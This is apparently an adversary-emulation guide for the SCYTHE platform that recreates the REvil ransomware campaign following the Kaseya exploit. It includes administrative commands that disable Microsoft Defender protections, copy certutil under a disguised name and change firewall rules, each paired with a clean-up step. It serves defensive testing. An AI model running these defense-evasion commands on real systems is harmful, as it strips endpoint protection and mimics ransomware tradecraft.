# REvil Campaign following Kaseya Exploit

## Cyber Threat Intelligence
This threat is based on Cyber Threat Intelligence from https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/

This REvil attack originated with the exploitation of the Kaseya Agent Monitor which runs with privilege. Therefore, this campaign requires running with local administrator privilege. Data exfiltration was not used which is interesting for a mid-2021 ransomware attack.

## Execute the Campaign
To emulate with SCYTHE:
1. Download and import the threat in JSON format to your SCYTHE instance
2. Create a new campaign using HTTPS and set header to User-Agent: curl
3. Import from Existing Threat: REvil-Kaseya
4. Launch Campaign
5. Name the EXE as AGENT.EXE 
6. Execute AGENT.EXE from an elevated cmd.exe

## Manual Emulation
From an administrative cmd.exe:
- ```ping 127.0.0.1 -n 5693```
- ```C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend```
- ```cmd.exe /c copy /Y "%SYSTEMROOT%\System32\certutil.exe" "%SYSTEMROOT%\cert.exe"```
- ```netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes```

### Manual Clean Up
- ```cmd.exe /c del "%SYSTEMROOT%\cert.exe"```
- ```netsh advfirewall firewall set rule group="Network Discovery" new enable=No```
```C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Advanced -SubmitSamplesConsent SendAllSamples```